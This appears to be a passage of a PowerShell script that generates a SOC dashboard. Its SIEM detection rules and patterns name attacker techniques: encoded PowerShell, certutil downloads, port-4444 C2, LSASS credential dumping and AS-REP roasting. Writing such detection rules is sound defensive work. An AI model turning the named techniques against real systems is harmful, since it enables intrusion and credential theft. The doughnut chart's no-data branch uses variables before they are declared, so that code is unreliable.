Add-SIEMRule "RULE-80" "Security Product Enumeration (sc+tasklist)" "T1518.001" "MEDIUM" "Discovery" "EID 4688 - sc query + tasklist /svc AV/EDR service enumeration" "EID 4688 - sc query + tasklist /svc AV/EDR discovery RULE-80" "AV enumeration precedes defense evasion. Correlate with subsequent process termination." (Count-SOCEvents "Security" @(4688) "sc") @("4688+sc-query")
# ─ RULES 81-85
Add-SIEMRule "RULE-81" "Sysmon: PS EncodedCommand Process Create" "T1059.001" "HIGH" "Execution" "Sysmon EID 1 - powershell.exe -EncodedCommand argument" "Sysmon EID 1 - PS EncodedCommand spawn RULE-81" "Review decoded command. Block encoded PS via AMSI and constrained language mode." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 1 -and ((Get-SysmonField2 $_ "CommandLine") -match "-Enc|-Encoded|SQBFAFgA")}).Count } else {0}) @("Sysmon:1+EncodedCommand") $sysSkip
Add-SIEMRule "RULE-82" "Sysmon: Certutil Download Pattern" "T1105" "HIGH" "Execution" "Sysmon EID 1 - certutil.exe -urlcache -split -f download" "Sysmon EID 1 - certutil urlcache download RULE-82" "certutil download bypasses proxy inspection. Review destination URL and saved file." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 1 -and ((Get-SysmonField2 $_ "CommandLine") -match "certutil|urlcache")}).Count } else {0}) @("Sysmon:1+certutil-urlcache") $sysSkip
Add-SIEMRule "RULE-83" "Sysmon: Registry Run Key Written" "T1547.001" "HIGH" "Persistence" "Sysmon EID 13 - Run key registry value set" "Sysmon EID 13 - CurrentVersion\\Run write soc_r83_ RULE-83" "Run key set by non-admin process = suspicious persistence. Review the binary referenced." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 13 -and ((Get-SysmonField2 $_ "TargetObject") -match "\\\\Run\\\\|soc_r83")}).Count } else {0}) @("Sysmon:13+Run-key") $sysSkip
Add-SIEMRule "RULE-84" "Sysmon: Script Dropped in Temp (SACL)" "T1059" "HIGH" "Execution" "Sysmon EID 11 - .ps1/.bat script file created in Temp path" "Sysmon EID 11 - soc_r84_payload_.ps1 dropped via cmd.exe SACL RULE-84" "Scripts in TEMP = staged execution. Isolate and inspect the dropped file content." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 11 -and ((Get-SysmonField2 $_ "TargetFilename") -match "soc_r84|staging_")}).Count } else {0}) @("Sysmon:11+script-TEMP") $sysSkip
Add-SIEMRule "RULE-85" "Sysmon: Outbound to Port 4444 (C2)" "T1041" "CRITICAL" "Command and Control" "Sysmon EID 3 - outbound TCP to port 4444 (Metasploit default C2)" "Sysmon EID 3 - TCP connect to 8.8.8.8:4444 RULE-85" "Port 4444 = Metasploit default C2. Immediate investigation and isolation required." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 3 -and ((Get-SysmonField2 $_ "DestinationPort") -eq "4444")}).Count } else {0}) @("Sysmon:3+port-4444") $sysSkip
# NOTE: RULE-86 (LSASS Process Access) is defined earlier in this file at the sysSkip block. No duplicate needed.
# ─ RULES 87-95
Add-SIEMRule "RULE-87" "Sysmon: DLL Loaded from TEMP (Non-System Path)" "T1055" "HIGH" "Defense Evasion" "Sysmon EID 7 - DLL loaded from TEMP/APPDATA (not System32)" "Sysmon EID 7 - soc_r87_.dll via regsvr32 from TEMP RULE-87" "Non-system-path DLL load = injection or sideloading. Quarantine and analyze immediately." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 7 -and ((Get-SysmonField2 $_ "ImageLoaded") -match "soc_r87|\\\\Temp\\\\")}).Count } else {0}) @("Sysmon:7+TEMP-DLL") $sysSkip
Add-SIEMRule "RULE-88" "Sysmon: Suspicious DNS Query (DGA Pattern)" "T1568" "HIGH" "Command and Control" "Sysmon EID 22 - DNS query for suspicious/DGA-like domain" "Sysmon EID 22 - nslookup malware.test.local DGA query RULE-88" "DGA/unusual domains = C2 beaconing. Extract domain and feed to threat intelligence." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 22 -and ((Get-SysmonField2 $_ "QueryName") -match "malware|test\.local")}).Count } else {0}) @("Sysmon:22+DGA") $sysSkip
Add-SIEMRule "RULE-89" "Sysmon: WMI EventFilter Created (CimInstance)" "T1546.003" "CRITICAL" "Persistence" "Sysmon EID 19 - WMI EventFilter in root\subscription (New-CimInstance)" "Sysmon EID 19 - SOC_R89F_ WMI EventFilter RULE-89" "WMI persistence survives reboots. Cleanup: remove filter+consumer+binding objects." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 19 -and (Is-SOCEvent $_ "Sysmon")}).Count } else {0}) @("Sysmon:19") $sysSkip
Add-SIEMRule "RULE-90" "Sysmon: Alternate Data Stream (ADS) Created" "T1564.004" "HIGH" "Defense Evasion" "Sysmon EID 11/15 - file with hidden ADS stream written" "Sysmon EID 11 - hidden_payload ADS written to soc_r90_ via SACL RULE-90" "ADS hides data from directory listings. Audit: use Get-Item -Stream * to find streams." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -in @(11,15) -and ((Get-SysmonField2 $_ "TargetFilename") -match "hidden_payload|soc_r90")}).Count } else {0}) @("Sysmon:11/15+ADS") $sysSkip
Add-SIEMRule "RULE-91" "Sysmon: MSBuild LOLBIN Execution" "T1127" "HIGH" "Execution" "Sysmon EID 1 - msbuild.exe spawned (AppLocker bypass)" "Sysmon EID 1 - msbuild.exe /version RULE-91" "MSBuild executes C# code bypassing AppLocker. Block via WDAC policy." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 1 -and ((Get-SysmonField2 $_ "Image") -match "msbuild")}).Count } else {0}) @("Sysmon:1+msbuild.exe") $sysSkip
Add-SIEMRule "RULE-92" "Sysmon: Localhost High-Port C2 Connect" "T1071" "HIGH" "Command and Control" "Sysmon EID 3 - TCP to localhost high-port (8080/8081 C2 pattern)" "Sysmon EID 3 - TCP to 127.0.0.1:8081 local C2 emulation RULE-92" "High-port local connections may indicate local C2 proxy or backdoor listener." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 3 -and ((Get-SysmonField2 $_ "DestinationPort") -match "^808[01]$")}).Count } else {0}) @("Sysmon:3+high-port-C2") $sysSkip
# NOTE: RULE-93 (AV Exclusion Path) is defined earlier in this file at the sysSkip block. No duplicate needed.
Add-SIEMRule "RULE-94" "Sysmon: Artifact Cleanup via cmd.exe del" "T1070.004" "HIGH" "Defense Evasion" "Sysmon EID 23 - file deleted by spawned process (requires FileDelete in sysmon.xml)" "Sysmon EID 23 - cmd.exe del soc_r94_artifact_ RULE-94" "File deletion of dropped artifacts = anti-forensics. Check for other cleanup activity." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -in @(23,26) -and (Is-SOCEvent $_ "Sysmon")}).Count } else {0}) @("Sysmon:23") $sysSkip
Add-SIEMRule "RULE-95" "Sysmon: Kernel Driver Load (HTTP.sys)" "T1547.006" "HIGH" "Persistence" "Sysmon EID 6 - kernel driver loaded outside normal boot (HTTP.sys/null.sys)" "Sysmon EID 6 - HTTP.sys restart or sc.exe kernel driver RULE-95" "Kernel driver loads outside normal boot = high-priority IOC. Verify digital signature." (if ($sysmonOK) { ($RawSysmon | Where-Object {$_.Id -eq 6}).Count } else {0}) @("Sysmon:6") $sysSkip

# ── QRADAR AD ATTACK CORRELATION RULES (AD01-AD05) ────────────────────────────
# Based on IBM QRadar content packs: "Windows Authentication Activity" and
# "Microsoft Active Directory" rule categories. Each maps to specific QRadar
# offenses, attack phases, and MITRE ATT&CK techniques.
Add-SIEMRule "RULE-AD01" "AdminSDHolder Object Modified" "T1484.001" "CRITICAL" "AD Attacks" "EID 5136 - modification on CN=AdminSDHolder,CN=System in AD DS" "EID 5136 - SOC_ADMINSD_ description change on AdminSDHolder object" "AdminSDHolder ACL is replicated to all protected groups every 60 min via SDProp. Any modification = domain persistence IOC. Enumerate all ACE changes using (Get-Acl 'AD:\CN=AdminSDHolder,...').Access." (Count-SOCEvents "Security" @(5136)) @("5136+AdminSDHolder") $(if (-not $adOK) {"AD not available"} else {""})
Add-SIEMRule "RULE-AD02" "Kerberos Pre-Auth Disabled (AS-REP Roast Setup)" "T1558.004" "CRITICAL" "AD Attacks" "EID 4738 - user account modified with DONT_REQUIRE_PREAUTH UAC flag set" "EID 4738 - Set-ADAccountControl DoesNotRequirePreAuth on soc_rad02_ test account" "Pre-auth disabled = account is AS-REP Roastable offline. Re-enable pre-auth immediately. Audit: Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$true} -Properties DoesNotRequirePreAuth." (Count-SOCEvents "Security" @(4738)) @("4738+UAC-PreAuth")
Add-SIEMRule "RULE-AD03" "Brute Force Success: Failures Then Valid Logon" "T1078" "CRITICAL" "AD Attacks" "EID 4625 x5+ followed by EID 4624 for same account (QRadar: Multi-Auth-Fail-Then-Success)" "EID 4625 x5 then EID 4624 for soc_rad03_ in same 60s window" "Account likely compromised via brute force. Disable account, reset password, initiate IR. Review source IP for spray origin." (([Math]::Min((Count-SOCEvents "Security" @(4625)),1) + [Math]::Min((Count-SOCEvents "Security" @(4624)),1))) @("4625x5","4624")
Add-SIEMRule "RULE-AD04" "Privileged Group Enumeration via SAMR/LDAP" "T1069.002" "HIGH" "AD Attacks" "EID 4799 (SAMR group enum) + EID 4688 net.exe/nltest - privileged group membership queried" "EID 4799 + EID 4688 - net group /domain + Get-ADGroupMember on Domain Admins/Enterprise Admins" "Group enumeration precedes targeted privilege escalation. Correlate with concurrent failed logons or lateral movement. Block SAMR with firewall if possible." ((Count-SOCEvents "Security" @(4799)) + (Count-SOCEvents "Security" @(4688) "net")) @("4799","4688+net-group")
Add-SIEMRule "RULE-AD05" "Sensitive Privilege Use: SeDebugPrivilege" "T1134" "CRITICAL" "AD Attacks" "EID 4673 (sensitive privilege called) + EID 4672 (special privileges at logon) - SeDebugPrivilege invoked against LSASS" "EID 4673 + EID 4672 - SOCLat OpenProcess(0x0410) on lsass.exe invoking SeDebugPrivilege" "SeDebugPrivilege is the Mimikatz prerequisite. Process holding this privilege against LSASS = credential dump in progress. Isolate immediately and forensically image memory." ((Count-SOCEvents "Security" @(4673)) + (Count-SOCEvents "Security" @(4672))) @("4673+SeDebug","4672")



$FiredCount    = ($SIEMResults | Where-Object {$_.Status -eq "FIRED"}).Count
$NotFiredCount = ($SIEMResults | Where-Object {$_.Status -eq "NOT FIRED"}).Count
$SkippedCount  = ($SIEMResults | Where-Object {$_.Status -eq "SKIPPED"}).Count
$TotalRules    = $SIEMResults.Count
$CritFired     = ($SIEMResults | Where-Object {$_.Status -eq "FIRED" -and $_.Severity -eq "CRITICAL"}).Count
$HighFired     = ($SIEMResults | Where-Object {$_.Status -eq "FIRED" -and $_.Severity -eq "HIGH"}).Count

Write-Host ("  [+] SIEM Rules: {0} FIRED | {1} NOT FIRED | {2} SKIPPED" -f $FiredCount,$NotFiredCount,$SkippedCount) -ForegroundColor $(if ($FiredCount -gt 0) {"Red"} else {"Green"})

# ── TIMELINE DATA ─────────────────────────────────────────────────────────────
$TimelineBuckets=[ordered]@{}
# Build JS epoch array for dynamic timeline
$AllEpochsJS = ($AllEvents_SOCOnly | Sort-Object TimeSort | ForEach-Object { [long]($_.TimeEpochMs) }) -join ','
if (-not $AllEpochsJS) { $AllEpochsJS = '' }

for ($i=119;$i -ge 0;$i--) { $b=(Get-Date).AddMinutes(-$i).ToString("HH:mm"); $TimelineBuckets[$b]=0 }
foreach ($ev in $AllEvents_SOCOnly) { $b=$ev.TimeSort.ToString("HH:mm"); if ($TimelineBuckets.ContainsKey($b)) { $TimelineBuckets[$b]++ } }
$TLLabelsJS = ($TimelineBuckets.Keys | ForEach-Object {"'$_'"}) -join ","
$TLDataJS   = ($TimelineBuckets.Values) -join ","

# ── BUILD SIEM RULE DETAIL JS OBJECT ─────────────────────────────────────────
$SIEMRuleJS = "const SIEM_RULES = {"
foreach ($rule in $SIEMResults) {
    $nameJS  = $rule.Name -replace "'","\\'"
    $descJS  = $rule.Description -replace "'","\\'"
    $detJS   = $rule.DetectionLogic -replace "'","\\'"
    $recJS   = $rule.Recommendation -replace "'","\\'"
    $SIEMRuleJS += "`n  '$($rule.RuleID)': { name:'$nameJS', mitre:'$($rule.MITRE)', severity:'$($rule.Severity)', category:'$($rule.Category)', description:'$descJS', detectionLogic:'$detJS', recommendation:'$recJS', eids:'$($rule.EIDsChecked)', count:$($rule.EventCount), status:'$($rule.Status)' },"
}
$SIEMRuleJS += "`n};"

# ── BUILD HTML ROWS ───────────────────────────────────────────────────────────
$SIEMRowsHTML = ""
foreach ($rule in ($SIEMResults | Sort-Object RuleID)) {
    $statusBadge = switch ($rule.Status) {
        "FIRED"     { "<span class='badge-fired'><span class='badge-dot'></span>FIRED &bull; $($rule.EventCount) events</span>" }
        "NOT FIRED" { "<span class='badge-clean'><span class='badge-dot'></span>CLEAN</span>" }
        "SKIPPED"   { "<span class='badge-skip'><span class='badge-dot'></span>SKIPPED</span>" }
    }
    $sevBadge = switch ($rule.Severity) {
        "CRITICAL" { "<span class='sev crit'>CRIT</span>" }
        "HIGH"     { "<span class='sev high'>HIGH</span>" }
        "MEDIUM"   { "<span class='sev med'>MED</span>" }
        default    { "<span class='sev info'>INFO</span>" }
    }
    $rowClass = switch ($rule.Status) { "FIRED"{"row-fired"} "NOT FIRED"{"row-clean"} default{"row-skip"} }
    $SIEMRowsHTML += "<tr class='siem-row $rowClass' data-rule='$($rule.RuleID)' data-status='$($rule.Status)' data-sev='$($rule.Severity)' data-cat='$($rule.Category)'><td class='td-rule'>$($rule.RuleID)</td><td>$sevBadge</td><td class='td-name'>$($rule.Name)</td><td class='td-cat'>$($rule.Category)</td><td><code class='mitre'>$($rule.MITRE)</code></td><td class='td-eids'>$($rule.EIDsChecked)</td><td>$statusBadge</td></tr>"
}

$EventRowsHTML = ""; $rowNum=0
foreach ($ev in ($SortedSOC | Select-Object -First 2000)) {
    $rowNum++
    $sevClass = switch ($ev.Severity) { "CRITICAL"{"sev-r-crit"} "HIGH"{"sev-r-high"} "MEDIUM"{"sev-r-med"} default{"sev-r-info"} }
    $sevB = switch ($ev.Severity) { "CRITICAL"{"<span class='sev crit'>CRIT</span>"} "HIGH"{"<span class='sev high'>HIGH</span>"} "MEDIUM"{"<span class='sev med'>MED</span>"} default{"<span class='sev info'>INFO</span>"} }
    $logB = switch ($ev.Log) { "Security"{"<span class='lb lb-sec'>SEC</span>"} "System"{"<span class='lb lb-sys'>SYS</span>"} "Sysmon"{"<span class='lb lb-smon'>SMON</span>"} "PowerShell"{"<span class='lb lb-ps'>PS</span>"} "TaskSched"{"<span class='lb lb-ts'>TASK</span>"} default{"<span class='lb lb-oth'>$($ev.Log.Substring(0,[Math]::Min($ev.Log.Length,4)).ToUpper())</span>"} }
    $detSafe = ($ev.Detail -replace "<","&lt;" -replace ">","&gt;" -replace '"',"&quot;") -replace '\s+',' '
    $userDisp = if ($ev.TargetUser -and $ev.TargetUser -ne "-" -and $ev.TargetUser -notmatch '^\s*$') {$ev.TargetUser} elseif ($ev.SubjectUser) {$ev.SubjectUser} else {"-"}
    $ipDisp   = if ($ev.SourceIP -and $ev.SourceIP -notin @("-","::1","127.0.0.1","")) {$ev.SourceIP} else {"-"}
    $EventRowsHTML += "<tr class='evt-row $sevClass' data-sev='$($ev.Severity)' data-cat='$($ev.Category)' data-eid='$($ev.EID)' data-log='$($ev.Log)' data-ts='$($ev.TimeEpochMs)'><td class='mono sm muted'>$rowNum</td><td class='mono td-time'>$($ev.Time)</td><td>$logB</td><td><span class='eid-tag'>$($ev.EID)</span></td><td>$sevB</td><td class='sm td-cat'>$($ev.Category)</td><td class='td-desc'>$($ev.Description)</td><td class='mono sm td-user'>$userDisp</td><td class='mono sm'>$ipDisp</td><td class='sm muted td-detail' title='$detSafe'>$detSafe</td></tr>"
}


# ── GENERATE HTML ─────────────────────────────────────────────────────────────
$ReportTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$FiredPct   = if ($TotalRules -gt 0) { [int](($FiredCount/$TotalRules)*100) } else {0}
# FIX-V24-01: Embed UTC epoch of report generation as JS constant.
# applyEvtFilters and rebuildTimeline must use this as "now" — NOT Date.now().
# Static HTML files are opened minutes/hours/days after generation; Date.now() keeps advancing
# but all event data-ts values are frozen at script-run time. Using Date.now() means all events
# fall outside the time window as soon as (time since generation) > activeWindowMins → blank table + blank timeline.
$ReportTimeEpochMS = [long]((Get-Date).ToUniversalTime() - [datetime]::new(1970,1,1,0,0,0,0,[System.DateTimeKind]::Utc)).TotalMilliseconds

$HTML = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS SOC | $env:COMPUTERNAME</title>
<script>
// ── FIX-V26-01: NXChart — Inline canvas chart engine (replaces Chart.js CDN) ──
// CDN (cdnjs.cloudflare.com) is blocked in most SOC lab networks, causing ALL charts
// to be blank with no error. This self-contained implementation requires zero network
// access and handles doughnut and line chart types with the same API as Chart.js:
//   new Chart(canvasEl, config)  →  NXChart(canvasEl, config)
//   chart.data.labels = [...]       (mutable data)
//   chart.data.datasets[0].data = [...]
//   chart.update()
(function(global) {
  function NXChart(canvas, cfg) {
    if (!canvas) return null;
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    const chart = {
      type: cfg.type,
      data: JSON.parse(JSON.stringify(cfg.data)),
      options: cfg.options || {},
      _resize: function() {
        const p = canvas.parentElement;
        if (p) { canvas.width = p.clientWidth || 360; canvas.height = p.clientHeight || 190; }
      },
      draw: function() {
        this._resize();
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        this.type === 'doughnut' ? this._donut() : this._line();
      },
      update: function() { this.draw(); },
      _donut: function() {
        const W = canvas.width, H = canvas.height;
        const ds = this.data.datasets[0], lbs = this.data.labels || [];
        const vals = ds.data || [], cols = ds.backgroundColor || [];
        const total = vals.reduce(function(a,b){return a+b;}, 0);
        if (total === 0) { ctx.fillStyle='#1e2d3d'; ctx.beginPath(); ctx.arc(cx,cy,r,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(cx,cy,ri,0,Math.PI*2); ctx.fillStyle='#0c1320'; ctx.fill(); return; } // FIX-PROD: no-data state
        const legH = 28, cx = W/2, cy = (H-legH)/2;
        const r = Math.max(10, Math.min(cx-4, cy-6) * 0.9);
        const co = parseFloat((this.options.cutout||'0').toString()) / 100;
        const ri = r * co;
        let s = -Math.PI/2;
        vals.forEach(function(v,i) {
          if (v <= 0) return;
          const a = v/total*Math.PI*2;
          ctx.beginPath(); ctx.moveTo(cx,cy);
          ctx.arc(cx,cy,r,s,s+a); ctx.closePath();
          ctx.fillStyle = cols[i]||'#3b9eff'; ctx.fill(); s+=a;
        });
        if (ri > 0) {
          ctx.beginPath(); ctx.arc(cx,cy,ri,0,Math.PI*2);
          ctx.fillStyle='#0c1320'; ctx.fill();
        }
        // Legend
        ctx.font = '10px sans-serif';
        const tw = lbs.reduce(function(a,l){return a+ctx.measureText(l).width+22;},0);
        let lx = Math.max(4,(W-tw)/2), ly = H-legH+8;
        lbs.forEach(function(l,i) {
          ctx.fillStyle = cols[i]||'#3b9eff'; ctx.fillRect(lx,ly,8,8);
          ctx.fillStyle = '#506070'; ctx.fillText(l,lx+12,ly+8);
          lx += ctx.measureText(l).width+24;
        });
      },
      _line: function() {
        const W = canvas.width, H = canvas.height;
        const ds = this.data.datasets[0];
        const lbs = this.data.labels||[], vals = ds.data||[];
        const n = vals.length; if (n < 2) return;
        const pd = {l:26,r:6,t:8,b:22};
        const gw = W-pd.l-pd.r, gh = H-pd.t-pd.b;
        const mx = Math.max.apply(null,vals)||1;
        const px = function(i){return pd.l+i/(n-1)*gw;};
        const py = function(v){return pd.t+gh*(1-Math.min(v/mx,1));};
        // Grid
        ctx.strokeStyle='rgba(30,45,61,.6)'; ctx.lineWidth=1;
        for (var g=0;g<=3;g++) {
          var gy=pd.t+gh*(1-g/3);
          ctx.beginPath(); ctx.moveTo(pd.l,gy); ctx.lineTo(pd.l+gw,gy); ctx.stroke();
          ctx.fillStyle='#506070'; ctx.font='8px monospace';
          ctx.fillText(Math.round(mx*g/3),1,gy+3);
        }
        // Fill
        ctx.beginPath();
        vals.forEach(function(v,i){i?ctx.lineTo(px(i),py(v)):ctx.moveTo(px(i),py(v));});
        ctx.lineTo(px(n-1),pd.t+gh); ctx.lineTo(px(0),pd.t+gh); ctx.closePath();
        ctx.fillStyle='rgba(59,158,255,.06)'; ctx.fill();
        // Line
        ctx.beginPath(); ctx.strokeStyle='#3b9eff'; ctx.lineWidth=1.5;
        vals.forEach(function(v,i){i?ctx.lineTo(px(i),py(v)):ctx.moveTo(px(i),py(v));});
        ctx.stroke();
        // Dots on non-zero buckets
        ctx.fillStyle='#3b9eff';
        vals.forEach(function(v,i){
          if(v>0){ctx.beginPath();ctx.arc(px(i),py(v),2.5,0,Math.PI*2);ctx.fill();}
        });
        // X labels
        ctx.fillStyle='#506070'; ctx.font='8px monospace';
        var step=Math.ceil(n/10);
        lbs.forEach(function(l,i){
          if(i%step!==0&&i!==n-1)return;
          ctx.fillText(l,px(i)-10,H-3);
        });
      }
    };
    chart.draw();
    window.addEventListener('resize', function(){ chart.draw(); }, {passive:true});
    return chart;
  }
  global.NXChart = NXChart;
  // Drop-in Chart.js compatibility shim
  global.Chart = NXChart;
})(window);
</script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
--bg:#060b14;--bg2:#0c1320;--bg3:#111a27;--bg4:#162130;
--border:#1e2d3d;--border2:#243344;
--txt:#c8d8e8;--txt2:#8098b0;--txt3:#506070;
--blue:#3b9eff;--cyan:#00d4ff;--green:#22dd88;--red:#ff4560;
--orange:#ffb020;--purple:#a070ff;--pink:#ff4090;
--red-dim:rgba(255,69,96,.12);--red-glow:rgba(255,69,96,.25);
--green-dim:rgba(34,221,136,.08);--blue-dim:rgba(59,158,255,.08);
--orange-dim:rgba(255,176,32,.1);--purple-dim:rgba(160,112,255,.1);
}
body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;font-size:13px;line-height:1.5;min-height:100vh;overflow-x:hidden}

/* ── Scrollbar ── */
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:#2e4560}

/* ── Navbar ── */
.nav{position:sticky;top:0;z-index:999;background:rgba(6,11,20,.92);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--border);height:56px;display:flex;align-items:center;padding:0 24px;gap:16px}
.nav-brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:15px;letter-spacing:.5px;color:#fff;text-decoration:none}
.nav-brand .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:glow 2s ease-in-out infinite}
@keyframes glow{0%,100%{opacity:1;box-shadow:0 0 10px var(--green)}50%{opacity:.4;box-shadow:0 0 4px var(--green)}}
.nav-sep{width:1px;height:24px;background:var(--border);flex-shrink:0}
.nav-meta{display:flex;align-items:center;gap:20px;font-size:11px;color:var(--txt2);font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace}
.nav-meta span{display:flex;align-items:center;gap:5px}
.nav-badge{padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:.5px}
.nav-badge.ok{background:var(--green-dim);color:var(--green);border:1px solid rgba(34,221,136,.2)}
.nav-badge.warn{background:var(--red-dim);color:var(--red);border:1px solid rgba(255,69,96,.2)}
.nav-right{margin-left:auto;display:flex;align-items:center;gap:8px}

/* ── Time window buttons ── */
.tw-group{display:flex;gap:4px;padding:4px;background:var(--bg2);border:1px solid var(--border);border-radius:8px}
.tw-btn{background:transparent;border:none;color:var(--txt2);padding:4px 12px;border-radius:5px;font-size:11px;font-weight:600;cursor:pointer;transition:all .2s;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif}
.tw-btn:hover{background:var(--bg3);color:var(--txt)}
.tw-btn.active{background:var(--blue);color:#fff;box-shadow:0 0 12px rgba(59,158,255,.3)}

/* ── Layout ── */
.wrap{max-width:1920px;margin:0 auto;padding:20px 24px 60px}

/* ── KPI row ── */
.kpi-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(155px,1fr));gap:12px;margin-bottom:20px}
.kpi{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:16px 18px;position:relative;overflow:hidden;cursor:default;transition:border-color .2s,transform .2s}
.kpi:hover{border-color:var(--border2);transform:translateY(-1px)}
.kpi::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;border-radius:10px 10px 0 0}
.kpi.k-blue::before{background:var(--blue)} .kpi.k-red::before{background:var(--red)} .kpi.k-orange::before{background:var(--orange)} .kpi.k-green::before{background:var(--green)} .kpi.k-purple::before{background:var(--purple)} .kpi.k-cyan::before{background:var(--cyan)}
.kpi-label{font-size:10px;font-weight:600;color:var(--txt2);text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
.kpi-val{font-size:28px;font-weight:900;line-height:1;margin-bottom:3px}
.kpi.k-blue .kpi-val{color:var(--blue)} .kpi.k-red .kpi-val{color:var(--red)} .kpi.k-orange .kpi-val{color:var(--orange)} .kpi.k-green .kpi-val{color:var(--green)} .kpi.k-purple .kpi-val{color:var(--purple)} .kpi.k-cyan .kpi-val{color:var(--cyan)}
.kpi-sub{font-size:10px;color:var(--txt3)}

/* ── Charts row ── */
.charts-row{display:grid;grid-template-columns:260px 1fr 260px;gap:12px;margin-bottom:20px}
@media(max-width:1100px){.charts-row{grid-template-columns:1fr 1fr}}
@media(max-width:700px){.charts-row{grid-template-columns:1fr}}
.chart-panel{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:16px}
.chart-title{font-size:10px;font-weight:700;color:var(--txt2);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;display:flex;align-items:center;gap:6px}
.chart-wrap{position:relative;height:190px}
.donut-center{text-align:center;margin-top:8px}
.donut-center .big{font-size:20px;font-weight:800;color:var(--red)}
.donut-center .sub{font-size:9px;color:var(--txt3);text-transform:uppercase;letter-spacing:1px}

/* ── Panel ── */
.panel{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px}
.panel-hdr{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.015);flex-wrap:wrap;row-gap:8px}
.panel-title{font-size:12px;font-weight:700;color:#e0ecf8;display:flex;align-items:center;gap:8px}
.panel-actions{margin-left:auto;display:flex;align-items:center;gap:8px}

/* ── Filter bar ── */
.filter-bar{padding:10px 14px;border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px;align-items:center;background:rgba(255,255,255,.01)}
.fb-label{font-size:10px;color:var(--txt3);font-weight:600;text-transform:uppercase;letter-spacing:.6px;margin-right:2px}
.fb-btn{background:var(--bg3);border:1px solid var(--border);color:var(--txt2);border-radius:6px;padding:4px 10px;font-size:10px;font-weight:600;cursor:pointer;transition:all .15s;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif}
.fb-btn:hover{border-color:var(--blue);color:var(--blue)}
.fb-btn.active{border-color:var(--blue);color:var(--blue);background:var(--blue-dim)}
.fb-btn.a-crit.active{border-color:var(--red);color:var(--red);background:var(--red-dim)}
.fb-btn.a-high.active{border-color:var(--orange);color:var(--orange);background:var(--orange-dim)}
.fb-sep{width:1px;height:16px;background:var(--border);align-self:center}
.fb-search{background:var(--bg3);border:1px solid var(--border);color:var(--txt);border-radius:6px;padding:5px 10px 5px 30px;font-size:11px;outline:none;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;width:200px}
.fb-search:focus{border-color:var(--blue)}
.search-wrap{position:relative;display:inline-block}
.search-wrap svg{position:absolute;left:8px;top:50%;transform:translateY(-50%);color:var(--txt3)}
.counter{font-size:10px;font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;color:var(--txt3)}

/* ── Tables ── */
.tbl-scroll{overflow:auto;max-height:520px}
.tbl{width:100%;border-collapse:collapse;font-size:11.5px}
.tbl th{padding:9px 12px;text-align:left;background:rgba(255,255,255,.025);border-bottom:2px solid var(--border);color:var(--txt2);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;white-space:nowrap;position:sticky;top:0;cursor:pointer;user-select:none;z-index:1}
.tbl th:hover{color:var(--blue)}
.tbl td{padding:8px 12px;border-bottom:1px solid rgba(30,45,61,.5);color:var(--txt);vertical-align:middle;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.tbl tbody tr:last-child td{border-bottom:none}
.tbl tbody tr:hover td{background:rgba(59,158,255,.04)}

/* ── SIEM rule rows ── */
.row-fired{border-left:3px solid rgba(255,69,96,.6)}
.row-fired td{background:rgba(255,69,96,.05)}
.row-clean td{background:rgba(34,221,136,.03)}
.row-skip{opacity:.45}
.siem-row{cursor:pointer}
.siem-row:hover td{background:rgba(59,158,255,.06) !important}
.detail-row{display:none}
.detail-row.open{display:table-row}
.detail-cell{padding:0 !important}
.detail-inner{padding:14px 20px 16px 40px;background:rgba(11,18,30,.6);border-top:1px solid var(--border);border-left:3px solid var(--blue)}
.detail-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px;margin-top:10px}
.detail-block label{display:block;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:var(--txt3);margin-bottom:4px}
